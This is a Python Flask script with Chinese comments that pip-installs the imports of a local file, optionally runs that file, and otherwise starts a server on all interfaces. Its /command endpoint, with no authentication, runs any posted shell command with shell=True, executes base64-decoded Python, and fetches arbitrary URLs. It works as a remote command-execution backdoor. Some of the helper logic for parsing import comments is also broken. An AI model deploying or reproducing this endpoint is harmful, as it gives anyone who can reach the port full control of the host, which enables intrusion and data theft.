from flask import Flask, request
import socket
import base64
import subprocess
import requests
import ast
import sys

app = Flask(__name__)

# 获取本机IP地址
ip_address = socket.gethostbyname(socket.gethostname())

# 为Flask指定实际端口
port = 5000

# 读取1.py文件内容
with open('1.py', 'r') as script_file:
    script_content = script_file.read()

# 提取导入的库及注释信息
imported_libraries = {}

def extract_libraries(script_content):
    tree = ast.parse(script_content)

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                imported_libraries[alias.name] = get_library_info(alias, node)
        elif isinstance(node, ast.ImportFrom):
            imported_libraries[node.module] = get_library_info(node)

def get_library_info(alias_or_module, import_node=None):
    library_info = {'name': None, 'version': None}
    if import_node and alias_or_module.name.startswith('# '):
        comments = alias_or_module.name[2:].split(',')
        for comment in comments:
            parts = comment.strip().split('-')
            if parts[0] == 'name' and len(parts) > 1:
                library_info['name'] = parts[1].strip()
            elif parts[0] == 'version' and len(parts) > 1:
                library_info['version'] = parts[1].strip()
    else:
        library_info['name'] = alias_or_module.name
    
    return library_info

# 提取导入的库及注释信息
extract_libraries(script_content)

# 安装缺失的库
for name, info in imported_libraries.items():
    version = f'=={info["version"]}' if info["version"] else ''
    try:
        subprocess.check_output(['pip', 'install', '--upgrade', f'{info["name"]}{version}'], text=True, stderr=subprocess.STDOUT)
        print(f'成功安装/升级库: {info["name"]}{version}')
    except subprocess.CalledProcessError as e:
        print(f'安装/升级库时出错：\n{e.output}')

# 设置变量，用于判断是否执行额外的脚本
run_extra_script = 1  # 设置为1时执行，设置为其他值时不执行

if run_extra_script == 1:
    try:
        result = subprocess.check_output(['python3', '1.py'], text=True, stderr=subprocess.STDOUT)
        print(f'执行 1.py 结果：\n{result}')
    except subprocess.CalledProcessError as e:
        print(f'执行 1.py 出错：\n{e.output}')
    
    sys.exit()  # 执行完 1.py 后自动退出程序

print(f'喵~服务器IP地址是：{ip_address}，程序运行端口是：{port}')

# ... （以下为原有的路由和处理逻辑）

# ... （以下为原有的路由和处理逻辑）
@app.route('/')
def home():
    return '欢迎来到喵~服务器'

@app.route('/command', methods=['POST'])
def receive_command():
    data = request.get_json()
    command = data.get('cmd')

    if command.startswith("py"):
        script_base64 = command[2:]
        decoded_script = base64.b64decode(script_base64).decode('utf-8')

        try:
            result = subprocess.check_output(['python3', '-c', decoded_script], text=True, stderr=subprocess.STDOUT)
            return f'执行结果：\n{result}'
        except subprocess.CalledProcessError as e:
            return f'执行错误：\n{e.output}'

    elif command.startswith("ip"):
        url = command[2:]
        try:
            response = requests.get(url)
            return f'对方服务器IP：{response.text}'
        except requests.RequestException as e:
            return f'获取对方服务器IP时出错：{str(e)}'

    else:
        try:
            result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            return f'执行结果：\n{result}'
        except subprocess.CalledProcessError as e:
            return f'执行错误：\n{e.output}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)
